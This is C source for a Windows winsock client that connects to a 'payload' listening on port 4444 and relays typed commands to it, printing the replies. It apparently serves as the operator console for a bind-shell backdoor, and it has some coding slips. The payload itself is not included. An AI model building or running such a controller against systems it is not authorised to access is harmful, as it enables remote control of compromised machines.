#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

// Two macros for stringizing s
// More info at https://gcc.gnu.org/onlinedocs/cpp/Argument-Prescan.html#Argument-Prescan
#define xstr(s) str(s)
#define str(s) #s

int initiateConnection();

int port; // the port the payload in listening on
char ip[24];

int main(){
    port = 4444;  // default value
    strcpy(ip, "192.168.1.1");  // default value

    // for use with the -D switch when compiling with gcc
    #ifdef PORT
        port = PORT;
    #endif
    #ifdef IP
        strcpy(ip, xstr(IP));
    #endif

    initiateConnection();

    return 0;
}

/*
Connect to the payload client that is listening on the given port
Return values:
    0 - exited successfuly
    1 - failure
*/
int initiateConnection(){
    // Initalize winsock
    WSADATA wsData;
    WORD version = MAKEWORD(2,2);
    int wsock = WSAStartup(version, &wsData);
    if ( wsock != 0) {
        printf("Can't initialize winsock. Quitting...\n");
        return 1;
    }

    // Create socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);  // the zero flag here means tcp??
    if (sock == INVALID_SOCKET){
        printf("Cannot create socket. Exiting...\n");
        WSACleanup();
        return 1;
    }

    // Fill in a hint structure (so this is like the other socket in the connection, the listening socket created by the payload)
    // Tells what to connect to and on what port
    struct sockaddr_in hint; // "in" at the end means IPv4
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port); // htons = host to network short
    inet_pton(AF_INET, ip, &hint.sin_addr);

    // connect to the payload
    int connResult = connect(sock, (struct sockaddr*)&hint, sizeof(hint));
    if (connResult == SOCKET_ERROR){
        printf("Error connecting. Exiting...\n");
        closesocket(sock); // should clean up the socket since it exists now
        WSACleanup();
        return 1;
    }
    printf("Connection established with %s through port %d\n", ip, port);

    // send and recieve data
    char buf[4096];
    char input[32];

    do {
        // prompt user
        printf("> ");
        scanf("%31s", input);

        int sendResult = send(sock, input, sizeof(input), 0); //maybe need a size+1 here?
        if (sendResult != SOCKET_ERROR){
            memset(buf, 0, sizeof(buf));
            
            int bytesRec = recv(sock, buf, sizeof(buf), 0); // waits for response and blocks - response it copied into buff
            if (bytesRec > 0){  // then print the message
                char * output = (char*)calloc(bytesRec, sizeof(char));
                strncpy(output, buf, bytesRec);
                printf("%s", output);
                free(output);
            }
        
        }

    } while (strcmp(input, "exit") != 0);


}